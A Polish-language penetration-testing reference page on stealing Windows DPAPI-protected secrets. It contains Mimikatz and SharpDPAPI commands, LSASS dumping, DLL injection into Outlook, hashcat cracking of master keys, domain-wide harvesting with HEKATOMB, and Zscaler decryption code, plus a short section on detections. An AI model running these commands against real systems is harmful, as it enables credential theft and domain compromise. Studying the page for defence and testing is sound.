# DPAPI - Wyodrębnianie haseł

{{#include ../../banners/hacktricks-training.md}}



## Czym jest DPAPI

Data Protection API (DPAPI) jest głównie wykorzystywane w systemie Windows do **symetrycznego szyfrowania asymetrycznych kluczy prywatnych**, wykorzystując jako istotne źródło entropii sekrety użytkownika lub systemu. Podejście to upraszcza szyfrowanie dla deweloperów, pozwalając im szyfrować dane za pomocą klucza wyprowadzonego z danych logowania użytkownika lub, w przypadku szyfrowania systemowego, z sekretów uwierzytelniania domeny, dzięki czemu deweloperzy nie muszą sami zarządzać ochroną klucza szyfrującego.

Najczęstszym sposobem użycia DPAPI są funkcje **`CryptProtectData` i `CryptUnprotectData`**, które pozwalają aplikacjom bezpiecznie szyfrować i odszyfrowywać dane w kontekście sesji procesu aktualnie zalogowanego użytkownika. Oznacza to, że zaszyfrowane dane mogą być odszyfrowane tylko przez tego samego użytkownika lub system, który je zaszyfrował.

Ponadto te funkcje akceptują również parametr **`entropy`**, który jest używany podczas szyfrowania i deszyfrowania, zatem aby odszyfrować coś zaszyfrowanego z użyciem tego parametru, musisz dostarczyć tę samą wartość entropy, która była użyta podczas szyfrowania.

### Generowanie klucza użytkownika

DPAPI generuje unikalny klucz (nazywany **`pre-key`**) dla każdego użytkownika na podstawie jego poświadczeń. Ten klucz jest wyprowadzany z hasła użytkownika i innych czynników, a algorytm zależy od typu użytkownika, lecz kończy się poprzez SHA1. Na przykład, dla użytkowników domenowych, **zależy on od NTLM hash użytkownika**.

To jest szczególnie interesujące, ponieważ jeśli atakujący może uzyskać hash hasła użytkownika, może:

- **Odszyfrować dowolne dane zaszyfrowane przy użyciu DPAPI** kluczem tego użytkownika bez potrzeby kontaktowania się z jakimkolwiek API
- Spróbować **złamać hasło** offline, próbując wygenerować prawidłowy klucz DPAPI

Co więcej, za każdym razem gdy użytkownik szyfruje jakieś dane za pomocą DPAPI, generowany jest nowy **master key**. To właśnie ten master key jest faktycznie używany do szyfrowania danych. Każdemu master key przypisywany jest **GUID** (Globally Unique Identifier), który go identyfikuje.

Master key są przechowywane w katalogu **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`**, gdzie `{SID}` to Security Identifier tego użytkownika. Master key jest przechowywany zaszyfrowany przez użytkownikowski **`pre-key`** oraz także przez **domain backup key** na potrzeby odzyskiwania (czyli ten sam klucz jest przechowywany zaszyfrowany dwukrotnie, dwoma różnymi sposobami).

Zauważ, że **domain key używany do zaszyfrowania master key znajduje się na domain controllers i nigdy się nie zmienia**, więc jeśli atakujący ma dostęp do domain controllera, może odzyskać domain backup key i odszyfrować master key wszystkich użytkowników w domenie.

Zaszyfrowane bloby zawierają w nagłówkach **GUID master key**, który został użyty do zaszyfrowania danych.

> [!TIP]
> DPAPI encrypted blobs zaczynają się od **`01 00 00 00`**

Znajdź klucze główne:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
This is what a bunch of Master Keys of a user will looks like:

![](<../../images/image (1121).png>)

### Machine/System key generation

To jest klucz używany przez maszynę do szyfrowania danych. Jest oparty na **DPAPI_SYSTEM LSA secret**, który jest specjalnym kluczem dostępnym tylko dla konta SYSTEM. Ten klucz służy do szyfrowania danych, które muszą być dostępne dla samego systemu, takich jak poświadczenia na poziomie maszyny lub sekretów systemowych.

Zwróć uwagę, że te klucze **nie mają domain backup**, więc są dostępne tylko lokalnie:

- **Mimikatz** może uzyskać do niego dostęp, zrzucając LSA secrets za pomocą polecenia: `mimikatz lsadump::secrets`
- Sekret jest przechowywany w rejestrze, więc administrator mógłby **zmodyfikować uprawnienia DACL, aby uzyskać do niego dostęp**. Ścieżka w rejestrze to: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`


### Protected Data by DPAPI

Wśród danych osobistych chronionych przez DPAPI znajdują się:

- Windows creds
- Internet Explorer i Google Chrome — hasła oraz dane autouzupełniania
- Hasła do kont e-mail i wewnętrznych FTP używane przez aplikacje takie jak Outlook i Windows Mail
- Hasła do udostępnionych folderów, zasobów, sieci bezprzewodowych oraz Windows Vault, w tym klucze szyfrujące
- Hasła do połączeń z pulpitem zdalnym, .NET Passport oraz prywatne klucze używane do różnych celów szyfrujących i uwierzytelniających
- Hasła sieciowe zarządzane przez Credential Manager oraz dane osobiste w aplikacjach używających CryptProtectData, takich jak Skype, MSN messenger i inne
- Zaszyfrowane bloby wewnątrz rejestru
- ...

Do danych chronionych na poziomie systemu należą:
- Hasła do WiFi
- Hasła zaplanowanych zadań
- ...

### Master key extraction options

- Jeśli użytkownik ma uprawnienia domain admin, może uzyskać dostęp do **domain backup key**, aby odszyfrować wszystkie master keys użytkowników w domenie:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- Z uprawnieniami administratora lokalnego możliwe jest **access the LSASS memory** w celu wydobycia DPAPI master keys wszystkich zalogowanych użytkowników oraz SYSTEM key.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- Jeśli użytkownik ma uprawnienia administratora lokalnego, może uzyskać dostęp do **DPAPI_SYSTEM LSA secret** w celu odszyfrowania kluczy głównych maszyny:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- Jeśli password lub hash NTLM użytkownika jest znany, możesz **bezpośrednio odszyfrować master keys tego użytkownika**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- Jeśli jesteś w sesji jako użytkownik, możliwe jest poproszenie DC o **backup key to decrypt the master keys using RPC**. Jeśli jesteś local admin i użytkownik jest zalogowany, możesz w tym celu **steal his session token**:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Lista Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Dostęp do zaszyfrowanych danych DPAPI

### Znajdź zaszyfrowane dane DPAPI

Typowe **chronione pliki** użytkowników znajdują się w:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Sprawdź również zamianę `\Roaming\` na `\Local\` w powyższych ścieżkach.

Przykłady enumeracji:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) może znaleźć zaszyfrowane DPAPI blobs w systemie plików, rejestrze i w B64 blobs:
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Zauważ, że [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (z tego samego repo) może być użyty do odszyfrowania za pomocą DPAPI wrażliwych danych, takich jak cookies.

### Klucze dostępu i dane

- **Użyj SharpDPAPI** aby uzyskać poświadczenia z plików zaszyfrowanych DPAPI z bieżącej sesji:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Pobierz informacje o poświadczeniach** takie jak zaszyfrowane dane i guidMasterKey.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Access masterkeys**:

Zdeszyfruj masterkey użytkownika żądającego **domain backup key** za pomocą RPC:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
Narzędzie **SharpDPAPI** obsługuje także następujące argumenty do odszyfrowania masterkey (zwróć uwagę, że można użyć `/rpc`, aby uzyskać klucz kopii zapasowej domeny, `/password`, aby użyć hasła w postaci jawnej, lub `/pvk`, aby wskazać plik prywatnego klucza domeny DPAPI...):
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **Decrypt danych przy użyciu masterkey**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
Narzędzie **SharpDPAPI** obsługuje również te argumenty do odszyfrowywania `credentials|vaults|rdg|keepass|triage|blob|ps` (zauważ, że można użyć `/rpc`, aby uzyskać klucz kopii zapasowej domeny, `/password`, aby użyć hasła jawnego, `/pvk`, aby wskazać plik prywatnego klucza DPAPI domeny, `/unprotect`, aby użyć sesji bieżącego użytkownika...):
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- Odszyfruj niektóre dane przy użyciu **bieżącej sesji użytkownika**:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---
### Obsługa opcjonalnej entropii ("Third-party entropy")

Niektóre aplikacje przekazują dodatkową wartość **entropy** do `CryptProtectData`. Bez tej wartości blob nie może zostać odszyfrowany, nawet jeśli znany jest prawidłowy masterkey. Uzyskanie entropii jest więc niezbędne przy atakowaniu poświadczeń chronionych w ten sposób (np. Microsoft Outlook, niektóre klienty VPN).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) to user-mode DLL, który hookuje funkcje DPAPI wewnątrz procesu docelowego i transparentnie rejestruje wszelką dostarczoną opcjonalną **entropy**. Uruchomienie EntropyCapture w trybie **DLL-injection** przeciwko procesom takim jak `outlook.exe` lub `vpnclient.exe` wygeneruje plik mapujący każdy bufor entropy do procesu wywołującego i blobu. Przechwyconą entropię można później przekazać do **SharpDPAPI** (`/entropy:`) lub **Mimikatz** (`/entropy:<file>`) w celu odszyfrowania danych.
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Łamanie masterkeyów offline (Hashcat & DPAPISnoop)

Microsoft wprowadził format masterkey **context 3** począwszy od Windows 10 v1607 (2016). `hashcat` v6.2.6 (grudzień 2023) dodał hash-modes **22100** (DPAPI masterkey v1 context ), **22101** (context 1) i **22102** (context 3), umożliwiając przyspieszone na GPU łamanie haseł użytkowników bezpośrednio z pliku masterkey. Atakujący mogą dlatego przeprowadzać ataki słownikowe lub brute-force bez interakcji z systemem celu.

`DPAPISnoop` (2024) automatyzuje proces:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
Narzędzie może także parsować Credential and Vault blobs, odszyfrowywać je za pomocą złamanych kluczy i eksportować hasła w postaci jawnej.


### Dostęp do danych innej maszyny

W **SharpDPAPI and SharpChrome** możesz wskazać opcję **`/server:HOST`** aby uzyskać dostęp do danych zdalnej maszyny. Oczywiście musisz mieć dostęp do tej maszyny, a w poniższym przykładzie zakłada się, że **znany jest klucz szyfrowania kopii zapasowej domeny**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Inne narzędzia

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) to narzędzie automatyzujące wyodrębnianie wszystkich użytkowników i komputerów z katalogu LDAP oraz wyodrębnianie klucza kopii zapasowej kontrolera domeny przez RPC. Skrypt następnie rozwiąże wszystkie adresy IP komputerów i wykona smbclient na wszystkich maszynach, aby pobrać wszystkie DPAPI bloby wszystkich użytkowników i odszyfrować wszystko przy użyciu klucza kopii zapasowej domeny.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Dzięki liście komputerów wyodrębnionej z LDAP możesz znaleźć każdą podsieć, nawet jeśli ich nie znałeś!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) potrafi automatycznie zrzucać sekrety chronione przez DPAPI. Wydanie 2.x wprowadziło:

* Równoległe zbieranie blobów z setek hostów
* Parsowanie masterkeyów **context 3** oraz automatyczna integracja z Hashcat do łamania haseł
* Wsparcie dla szyfrowanych ciasteczek Chrome "App-Bound" (zob. następna sekcja)
* Nowy tryb **`--snapshot`** do wielokrotnego sondowania punktów końcowych i porównywania świeżo utworzonych blobów

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) to parser w C# dla plików masterkey/credential/vault, który może wyprowadzać formaty Hashcat/JtR i opcjonalnie automatycznie wywoływać łamanie. W pełni obsługuje formaty machine i user masterkey do Windows 11 24H1.

## Typowe wykrycia

- Dostęp do plików w `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` i innych katalogach związanych z DPAPI.
- Szczególnie z udziału sieciowego takiego jak **C$** lub **ADMIN$**.
- Użycie **Mimikatz**, **SharpDPAPI** lub podobnych narzędzi do dostępu do pamięci LSASS lub zrzutu masterkeyów.
- Zdarzenie **4662**: *An operation was performed on an object* – można je skorelować z dostępem do obiektu **`BCKUPKEY`**.
- Zdarzenie **4673/4674** gdy proces żąda *SeTrustedCredManAccessPrivilege* (Credential Manager)

---
### Luki 2023–2025 i zmiany w ekosystemie

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (listopad 2023). Atakujący z dostępem do sieci mógł nakłonić członka domeny do pobrania złośliwego klucza kopii zapasowej DPAPI, co umożliwia odszyfrowanie masterkeyów użytkowników. Załatane w listopadowej aktualizacji kumulacyjnej 2023 — administratorzy powinni upewnić się, że kontrolery domeny (DC) i stacje robocze mają wszystkie poprawki.
* **Chrome 127 “App-Bound” cookie encryption** (lipiec 2024) zastąpiło starszą ochronę opartą wyłącznie na DPAPI dodatkowym kluczem przechowywanym w **Credential Manager** użytkownika. Odszyfrowanie ciasteczek offline wymaga teraz zarówno DPAPI masterkey, jak i **GCM-wrapped app-bound key**. SharpChrome v2.3 i DonPAPI 2.x potrafią odzyskać dodatkowy klucz, gdy działają w kontekście użytkownika.

### Studium przypadku: Zscaler Client Connector – niestandardowa entropia pochodząca z SID

Zscaler Client Connector przechowuje kilka plików konfiguracyjnych w `C:\ProgramData\Zscaler` (np. `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Każdy plik jest zaszyfrowany przy użyciu **DPAPI (Machine scope)**, ale dostawca dostarcza **niestandardową entropię**, która jest *obliczana w czasie wykonywania* zamiast być zapisana na dysku.

Entropia jest odtwarzana z dwóch elementów:

1. Wbudowany na stałe sekret osadzony w `ZSACredentialProvider.dll`.
2. The **SID** of the Windows account the configuration belongs to.

Algorytm zaimplementowany przez DLL jest równoważny:
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
Ponieważ sekret jest osadzony w DLL, który można odczytać z dysku, **każdy lokalny atakujący z uprawnieniami SYSTEM może zregenerować entropię dla dowolnego SID** i odszyfrować blobs offline:
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
Deszyfrowanie daje pełną konfigurację JSON, w tym każde **sprawdzenie stanu urządzenia** i jego oczekiwaną wartość — informacje bardzo cenne przy próbach obejścia po stronie klienta.

> Wskazówka: pozostałe zaszyfrowane artefakty (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) są chronione przez DPAPI **bez** entropii (`16` bajtów o wartości 0). Mogą więc zostać odszyfrowane bezpośrednio za pomocą `ProtectedData.Unprotect` po uzyskaniu uprawnień SYSTEM.

## Referencje

- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)

- [https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [https://github.com/Leftp/DPAPISnoop](https://github.com/Leftp/DPAPISnoop)
- [https://pypi.org/project/donpapi/2.0.0/](https://pypi.org/project/donpapi/2.0.0/)

{{#include ../../banners/hacktricks-training.md}}
